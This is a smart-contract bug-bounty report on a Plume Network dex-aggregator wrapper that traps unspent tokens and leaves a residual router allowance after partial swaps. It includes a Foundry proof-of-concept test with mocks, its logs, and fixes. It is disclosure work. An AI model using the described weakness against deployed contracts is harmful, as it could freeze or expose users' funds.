# 52923 sc critical partial fill traps source token residual inside the wrapper and leaves unsafe residual allowance

**Submitted on Aug 14th 2025 at 10:43:30 UTC by @LoopGhost007 for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #52923
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network-nucleus-boring-vault/blob/main/src/helper/DexAggregatorWrapperWithPredicateProxy.sol>
* **Impacts:** Permanent freezing of funds

## Description

### Brief / Intro

I have identified a critical vulnerability in `DexAggregatorWrapperWithPredicateProxy` where partial fills during swaps (via 1inch path) can permanently trap the remaining source tokens (`srcToken`) inside the wrapper contract and leave a non-zero residual allowance to the router. This occurs because the wrapper ignores the router-reported spent amount and never refunds the unspent portion to the user, nor does it sanitize the allowance afterwards.

In the reproduced PoC, a swap that spends only 1 wei of WETH out of 1 ETH causes 0.999999999999999999 WETH to remain stuck in the wrapper, with the same amount left as residual allowance to the router.

### Vulnerability Details

It all happens in the following functions of `DexAggregatorWrapperWithPredicateProxy.sol`:

* `_oneInchHelper` (non-native path)
* `depositOneInch` (calls `_oneInchHelper`)
* Similarly applicable in `_okxHelper` (OKX path) and its public entrypoints

{% stepper %}
{% step %}

### Problematic flow (1inch, non-native path)

The vulnerable sequential flow:

* The wrapper pulls `desc.amount` of `srcToken` from the user and `safeApprove()`’s the aggregator for that full amount.
* The router executes a swap which may partially fill, spending only a portion of `desc.amount` and returning `(returnAmount, spentAmount)`.
* The wrapper ignores `spentAmount` and never refunds `(desc.amount - spentAmount)` to the user.
* The wrapper also does not clear the residual allowance `(desc.amount - spentAmount)` to the router.
* The unspent `srcToken` remains stuck in the wrapper indefinitely, and the leftover allowance presents an extra risk surface.

Partial fill is an operational reality for modern DEX aggregators (including 1inch v6), which is why their interface returns `spentAmount`. The current implementation simply doesn’t use it.
{% endstep %}
{% endstepper %}

Evidence from the PoC logs:

* Wrapper residual WETH (trapped): 999999999999999999
* Residual allowance to aggregator: 999999999999999999

This demonstrates both trapped funds and unsafe leftover allowance.

## Impact Details

{% hint style="danger" %}
Critical-severity permanent freezing of user funds. Additional risks:

* A malicious/compromised router or approved spender could pull the trapped tokens later using the leftover allowance.
* Even without an active pull, funds are effectively frozen since the wrapper exposes no user-facing method to recover the residual `srcToken`.
  {% endhint %}

## Suggested Mitigation

{% hint style="warning" %}

* Refund unspent `srcToken` on partial fills:
  * Read `spentAmount` from the router’s return value.
  * Compute `unspent = desc.amount - spentAmount`.
  * If `unspent > 0`:
    * Non-native path: transfer unspent `srcToken` back to `msg.sender`.
    * Native path (WETH): either transfer WETH back or unwrap to ETH and refund.
* Sanitize allowances:
  * After executing the swap, set allowance(aggregator, 0) to avoid dangling approvals.
  * Prefer “reset-to-zero then set” pattern for tokens with non-standard approval semantics.
* Apply same logic to the OKX path in `_okxHelper`:
  * Detect actual spent via balance deltas around the router call.
  * Refund any unspent amount to the user and zero-out the allowance to `okxApprover`.
    {% endhint %}

## Proof of Concept

The PoC is a Foundry test that configures a mock 1inch router to spend only 1 wei of `srcToken` and return 1 wei of `dstToken`. The wrapper pulls 1 ETH of WETH from the user, approves the router for the full amount, and then ends up with \~1 ETH trapped plus the same amount left as residual allowance.

This confirms the issue in a realistic setup using the in-scope wrapper and the project’s teller/vault stack.

<details>

<summary>PoC remappings.txt</summary>

```txt
@openzeppelin/contracts/=lib/predicate-contracts/lib/openzeppelin-contracts/contracts/
@solmate/=lib/predicate-contracts/lib/solmate/src/
@forge-std/=lib/forge-std/src/
forge-std/=lib/forge-std/src/
@ds-test/=lib/forge-std/lib/ds-test/src/
ds-test/=lib/forge-std/lib/ds-test/src/
@openzeppelin/=lib/openzeppelin-contracts/
@ion-protocol/=lib/ion-protocol/src/

@layerzerolabs/=node_modules/@layerzerolabs/
@predicate/=lib/predicate-contracts/
@uniswap/v3-core/=lib/v3-core/
```

</details>

<details>

<summary>PoC code (place as test/PartialFillTrappedResidual.t.sol)</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Wrapper
import { DexAggregatorWrapperWithPredicateProxy } from "src/helper/DexAggregatorWrapperWithPredicateProxy.sol";
import { TellerWithMultiAssetSupportPredicateProxy } from "src/base/Roles/TellerWithMultiAssetSupportPredicateProxy.sol";

// Core stack
import { BoringVault } from "src/base/BoringVault.sol";
import { AccountantWithRateProviders } from "src/base/Roles/AccountantWithRateProviders.sol";
import { TellerWithMultiAssetSupport } from "src/base/Roles/TellerWithMultiAssetSupport.sol";
import { RolesAuthority, Authority } from "@solmate/auth/authorities/RolesAuthority.sol";

// Structs/Interfaces
import { PredicateMessage } from "@predicate/src/interfaces/IPredicateClient.sol";
import { AggregationRouterV6 } from "src/interfaces/AggregationRouterV6.sol";
import { IOKXRouter } from "src/interfaces/IOKXRouter.sol";
import { ERC20 } from "@solmate/tokens/ERC20.sol";
import { WETH } from "@solmate/tokens/WETH.sol";

// 1) Partial-fill 1inch mock: spends only 1 wei of srcToken and returns 1 wei of dstToken.
contract PartialFill1Inch is AggregationRouterV6 {
    function swap(address, SwapDescription calldata desc, bytes calldata)
        external
        payable
        override
        returns (uint256, uint256)
    {
        // Spend only 1 wei of the srcToken from msg.sender (wrapper)
        ERC20(address(desc.srcToken)).transferFrom(msg.sender, address(this), 1);

        // Return exactly 1 wei of dstToken to the wrapper (dstReceiver == wrapper enforced by wrapper)
        ERC20(address(desc.dstToken)).transfer(msg.sender, 1);

        // returnAmount=1, spentAmount=1
        return (1, 1);
    }
}

// 2) Minimal predicate proxy that authorizes everything
contract AllowAllPredicateProxy {
    function genericUserCheckPredicate(address, PredicateMessage calldata) external pure returns (bool) {
        return true;
    }
}

contract PartialFill_TrappedResidual_PoC is Test {
    // Core
    WETH public weth;
    BoringVault public vault;
    AccountantWithRateProviders public accountant;
    TellerWithMultiAssetSupport public teller;
    RolesAuthority public roles;

    // In-scope wrapper and deps
    DexAggregatorWrapperWithPredicateProxy public wrapper;
    PartialFill1Inch public oneInch;
    AllowAllPredicateProxy public predicate;

    address public user = address(0xBEEF1);

    function setUp() public {
        vm.txGasPrice(0);
        vm.deal(user, 10 ether);

        // Core stack
        weth = new WETH();
        vault = new BoringVault(address(this), "BoringVault", "BV", 18);
        accountant = new AccountantWithRateProviders(
            address(this), address(vault), address(this), 1e18, address(weth), 10010, 9990, 1, 0
        );
        teller = new TellerWithMultiAssetSupport(address(this), address(vault), address(accountant));

        roles = new RolesAuthority(address(this), Authority(address(0)));
        vault.setAuthority(roles);
        teller.setAuthority(roles);
        uint8 ROLE_TELLER = 3;
        roles.setUserRole(address(teller), ROLE_TELLER, true);
        roles.setRoleCapability(ROLE_TELLER, address(vault), vault.enter.selector, true);
        roles.setRoleCapability(ROLE_TELLER, address(vault), vault.exit.selector, true);

        // Support WETH in teller
        teller.addAsset(weth);

        // Mocks
        oneInch = new PartialFill1Inch();
        predicate = new AllowAllPredicateProxy();

        // Wrapper (in-scope)
        wrapper = new DexAggregatorWrapperWithPredicateProxy(
            oneInch,
            IOKXRouter(address(0)),
            address(0xDEAD),
            weth,
            TellerWithMultiAssetSupportPredicateProxy(payable(address(predicate)))
        );

        // Authorize wrapper to interact with teller/vault
        uint8 ROLE_WRAPPER = 5;
        roles.setUserRole(address(wrapper), ROLE_WRAPPER, true);
        roles.setRoleCapability(ROLE_WRAPPER, address(teller), teller.deposit.selector, true);

        // Prefund the router with 1 wei of WETH so it can return swap output
        weth.deposit{value: 1}();
        weth.transfer(address(oneInch), 1);
    }

    function _emptyPredicate() internal pure returns (PredicateMessage memory p) {
        return PredicateMessage({ taskId: "", expireByTime: 0, signerAddresses: new address[](0), signatures: new bytes[](0) });
    }

    // CRITICAL: Partial fill traps srcToken residual in the wrapper and leaves residual allowance
    function test_CRITICAL_partialFill_traps_srcToken_and_leaves_allowance() public {
        console.log("--- PoC: Partial Fill Freezes Residual srcToken in Wrapper (WETH->WETH) ---");

        // User preps WETH as srcToken
        vm.startPrank(user);
        weth.deposit{value: 1 ether}();
        weth.approve(address(wrapper), type(uint256).max);

        AggregationRouterV6.SwapDescription memory desc = AggregationRouterV6.SwapDescription({
            srcToken: ERC20(address(weth)),
            dstToken: ERC20(address(weth)),
            srcReceiver: payable(address(0)),
            dstReceiver: payable(address(wrapper)),
            amount: 1 ether,
            minReturnAmount: 1,
            flags: 0
        });

        // Non-native path (nativeValueToWrap=0)
        wrapper.depositOneInch(
            ERC20(address(weth)), // supportedAsset (vault supports WETH)
            teller,
            0,                // minimumMint
            address(0),       // executor
            desc,
            "",               // data
            0,                // nativeValueToWrap
            _emptyPredicate()
        );
        vm.stopPrank();

        // The mock spent only 1 wei; residual (1 ether - 1 wei) remains stuck in the wrapper
        uint256 trapped = weth.balanceOf(address(wrapper));
        console.log("Wrapper residual WETH (trapped):", trapped);
        assertEq(trapped, 1 ether - 1, "Residual srcToken should be trapped in the wrapper due to partial fill");

        // Residual allowance to router is also left non-zero
        uint256 allowanceLeft = weth.allowance(address(wrapper), address(oneInch));
        console.log("Residual allowance to aggregator:", allowanceLeft);
        assertEq(allowanceLeft, 1 ether - 1, "Residual allowance to router should remain after partial fill");

        console.log("VULNERABILITY CONFIRMED (CRITICAL): Partial fill froze the srcToken residual in the wrapper.");
    }
}
```

</details>

### Execution Logs

Run `forge test -vv --match-path test/PartialFillTrappedResidual.t.sol`. Example output from PoC:

```
Ran 1 test for test/PartialFillTrappedResidual.t.sol:PartialFill_TrappedResidual_PoC
[PASS] test_CRITICAL_partialFill_traps_srcToken_and_leaves_allowance() (gas: 337734)
Logs:
  --- PoC: Partial Fill Freezes Residual srcToken in Wrapper (WETH->WETH) ---
  Wrapper residual WETH (trapped): 999999999999999999
  Residual allowance to aggregator: 999999999999999999
  VULNERABILITY CONFIRMED (CRITICAL): Partial fill froze the srcToken residual in the wrapper.
  
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 34.97ms (8.08ms CPU time)
```

If you want, I can:

* Suggest small, concrete code patches to fix the exact functions (`_oneInchHelper`, `_okxHelper`) that read `spentAmount`, refund unspent tokens, and zero allowances; or
* Produce a unit test that validates the fix (ensures no trapped balance and allowance is zero after partial fill).
